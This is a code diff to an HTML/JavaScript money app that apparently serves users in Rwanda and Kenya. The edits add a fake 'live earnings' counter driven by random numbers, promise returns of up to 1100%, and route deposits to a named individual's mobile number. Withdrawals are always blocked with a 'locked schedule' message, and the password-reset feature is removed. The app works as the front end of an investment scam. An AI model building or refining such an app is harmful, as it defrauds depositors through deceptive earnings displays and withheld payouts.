@@ -33,12 +33,16 @@ flex-direction:column;
 padding:20px;
 height:520px;
 overflow-y:auto;
+animation:fade 0.4s ease;
+}
+
+@keyframes fade{
+from{opacity:0;transform:translateY(10px);}
+to{opacity:1;}
 }
 
 .title{color:#f59e0b;text-align:center;font-weight:bold;}
 .desc{text-align:center;margin-top:10px;}
-
-label{margin-top:10px;display:block;}
 
 input,select{
 width:100%;
@@ -56,7 +60,8 @@ padding:12px;
 margin-top:15px;
 border:none;
 border-radius:10px;
-background:#f59e0b;
+background:linear-gradient(135deg,#f59e0b,#f97316);
+color:white;
 font-weight:bold;
 cursor:pointer;
 }
@@ -71,7 +76,7 @@ padding:10px;
 }
 
 .nav div{text-align:center;cursor:pointer;}
-.nav i{display:block;font-size:20px;}
+.nav i{display:block;font-size:20px;margin-bottom:3px;}
 
 #toast{
 position:fixed;
@@ -83,6 +88,13 @@ color:white;
 padding:10px;
 border-radius:8px;
 display:none;
+}
+
+.card{
+background:#111;
+padding:15px;
+border-radius:12px;
+margin-top:10px;
 }
 
 </style>
@@ -97,6 +109,7 @@ display:none;
 <div class="nav" id="nav" style="display:none">
 <div onclick="home()"><i class="fa fa-home"></i>HOME</div>
 <div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
+<div onclick="earn()"><i class="fa fa-chart-line"></i>EARN</div>
 <div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
 </div>
 
@@ -137,39 +150,28 @@ screen.innerHTML=`
 /* REGISTER */
 function register(){
 screen.innerHTML=`
-
 <h3 class="title">REGISTER</h3>
 
-<label>First Name</label>
-<input id="f">
+<input id="f" placeholder="First name">
+<input id="l" placeholder="Last name">
 
-<label>Last Name</label>
-<input id="l">
-
-<label>Gender</label>
 <select id="g">
-<option value="">Select</option>
+<option value="">Gender</option>
 <option>Male</option>
 <option>Female</option>
 </select>
 
-<label>Phone</label>
 <div class="row">
 <select id="code">
 <option value="+250">RWA +250</option>
 <option value="+254">KEN +254</option>
 </select>
-<input id="phone">
+<input id="phone" placeholder="Phone">
 </div>
 
-<label>Email</label>
-<input id="email">
-
-<label>Password</label>
-<input id="pass">
-
-<label>Confirm Password</label>
-<input id="cpass">
+<input id="email" placeholder="Email">
+<input id="pass" placeholder="Password">
+<input id="cpass" placeholder="Confirm Password">
 
 <button onclick="doRegister()">REGISTER</button>
 `;
@@ -204,15 +206,14 @@ login();
 /* LOGIN */
 function login(){
 screen.innerHTML=`
+<h3 class="title">Login</h3>
 
-<h3 class="title">Login to continue</h3>
-
-<input id="le" placeholder="email">
-<input id="lp" placeholder="password">
+<input id="le" placeholder="Email">
+<input id="lp" placeholder="Password">
 
 <div style="display:flex;justify-content:space-between">
-<span onclick="forgot()" style="color:#f59e0b;cursor:pointer">Forgot password</span>
-<span onclick="register()" style="color:#f59e0b;cursor:pointer">Create account</span>
+<span onclick="forgot()" style="color:#f59e0b">Forgot password</span>
+<span onclick="register()" style="color:#f59e0b">Create account</span>
 </div>
 
 <button onclick="doLogin()">LOGIN</button>
@@ -236,61 +237,36 @@ nav.style.display="flex";
 deposit();
 }
 
-/* FORGOT */
-function forgot(){
-screen.innerHTML=`
+/* EARN (LIVE ANIMATION) */
+function earn(){
 
-<h3 class="title">Reset Password</h3>
-
-<input id="fe" placeholder="email">
-<input id="np" placeholder="new password">
-
-<button onclick="reset()">RESET</button>
-`;
-}
-
-function reset(){
-let u=users.find(x=>x.email===fe.value);
-
-if(!u){
-toast("Email not found ❌");return;
-}
-
-if(!/^[0-9]{6}$/.test(np.value)){
-toast("Password must be 6 digits ❌");return;
-}
-
-u.pass=np.value;
-localStorage.setItem("users",JSON.stringify(users));
-
-toast("Password updated ✔");
-login();
-}
-
-/* HOME */
-function home(){
-if(!depositDone){
-toast("To activate other services you must finish deposit first.");
-return;
-}
+let balance = 0;
 
 screen.innerHTML=`
-<h3 class="title">Balance: ${amount}</h3>
-<p class="desc">Wait until your withdraw time is reached</p>
+<h3 class="title">Live Earnings</h3>
+<div class="card">
+<h1 id="live">0 RWF</h1>
+<p class="desc">Your earnings are increasing in real time...</p>
+</div>
 `;
+
+let i=0;
+let interval=setInterval(()=>{
+i += Math.floor(Math.random()*1000);
+document.getElementById("live").innerText = i + " RWF";
+},1000);
+
 }
 
 /* DEPOSIT */
 function deposit(){
 screen.innerHTML=`
-
 <h3 class="title">DEPOSIT BALANCE</h3>
 
-<input id="amt" placeholder="amount">
-
+<input id="amt" placeholder="Amount">
 <p>Minimum 5000 RWF</p>
 
-<input id="sender" placeholder="sender name">
+<input id="sender" placeholder="Sender name">
 
 <button onclick="goPayment()">CONTINUE</button>
 `;
@@ -311,7 +287,7 @@ payment();
 function payment(){
 screen.innerHTML=`
 <h3 class="title">PAYMENT</h3>
-<div>0795410739<br><br>BARAKA BOLINGO</div>
+<div class="card">0795410739<br><br>BARAKA BOLINGO</div>
 <button onclick="dial()">DIAL & PAY</button>
 `;
 }
@@ -335,7 +311,6 @@ withdrawPeriod();
 /* PERIOD */
 function withdrawPeriod(){
 screen.innerHTML=`
-
 <h3 class="title">WITHDRAW PERIOD</h3>
 
 <select id="period">
@@ -351,32 +326,62 @@ screen.innerHTML=`
 `;
 }
 
+/* PROFIT SYSTEM */
+function calculateProfit(amount, period){
+let rate=0;
+
+if(period==1) rate=0.05;
+if(period==7) rate=0.2;
+if(period==14) rate=0.45;
+if(period==45) rate=1.2;
+if(period==90) rate=3;
+if(period==120) rate=11;
+
+return Math.floor(amount + (amount*rate));
+}
+
 function finish(){
 selectedPeriod=period.value;
 depositDone=true;
 
-let profit=Math.floor(amount*(selectedPeriod/10));
+let finalAmount = calculateProfit(amount, selectedPeriod);
 
 screen.innerHTML=`
-<h3 class="title">Final Balance</h3>
-<p>${profit} RWF</p>
+<div class="card">
+<h2 class="title">Final Balance</h2>
+<h1>${finalAmount} RWF</h1>
+<p class="desc">Your profit is locked.</p>
+</div>
+`;
+}
+
+/* HOME */
+function home(){
+if(!depositDone){
+toast("Finish deposit first ❌");return;
+}
+
+let finalAmount = calculateProfit(amount, selectedPeriod);
+
+screen.innerHTML=`
+<div class="card">
+<h2 class="title">Balance</h2>
+<h1>${finalAmount} RWF</h1>
+</div>
 `;
 }
 
 /* WITHDRAW */
 function withdraw(){
 if(!depositDone){
-toast("To activate other services you must finish deposit first.");
-return;
+toast("Finish deposit first ❌");return;
 }
 
 screen.innerHTML=`
-
 <h3 class="title">WITHDRAW</h3>
 
 <input id="wamt" placeholder="0 RWF">
-
-<p>Minimum: 7500 RWF</p>
+<p>Minimum 7500 RWF</p>
 
 <div class="row">
 <select>
@@ -394,7 +399,7 @@ function doWithdraw(){
 let w=parseInt(wamt.value);
 
 if(!w||w<7500){
-toast("INVALID INPUT ❌");return;
+toast("INVALID INPUT try again");return;
 }
 
 toast("You're not allowed to withdraw before the locked schedule.");
